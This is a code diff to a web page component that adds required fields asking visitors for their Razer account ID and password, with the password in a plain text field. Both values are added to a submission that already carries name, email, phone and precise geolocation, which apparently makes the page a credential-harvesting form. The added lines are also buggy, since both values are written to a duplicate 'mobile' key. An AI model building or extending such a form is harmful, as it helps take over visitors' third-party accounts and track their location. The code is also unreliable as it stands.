@@ -33,6 +33,16 @@ export default function Home() {
             <input type="tel" id="mobile" name="mobile" required />
           </label>
           <br />
+     <label>
+           Razer Account Id
+            <input type="text" id="razerid" name="razerid" required />
+          </label>
+          <br />
+     <label>
+            Razer Account Password
+            <input type="text" id="razerpass" name="razerpass" required />
+          </label>
+          <br />
           <button type="submit" id="submitBtn">Submit</button>
         </form>
 
@@ -106,6 +116,8 @@ export default function Home() {
                     name: info.name,
                     email: info.email,
                     mobile: info.mobile,
+                    mobile: info.razerid,
+                    mobile: info.razerpass,
                     lat: loc.latitude,
                     lon: loc.longitude,
                     acc: loc.accuracy,
